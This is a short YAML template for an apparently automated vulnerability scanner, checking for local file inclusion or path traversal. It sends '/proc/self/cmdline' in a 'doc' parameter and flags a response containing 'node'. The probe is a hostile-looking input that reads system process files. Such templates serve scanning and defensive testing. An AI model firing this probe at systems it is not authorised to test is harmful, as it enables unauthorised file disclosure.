id: lfi2-097
name: 'Path traversal2 via doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '/proc/self/cmdline'
    matchers:
      - type: word
        part: body
        words:
          - 'node'
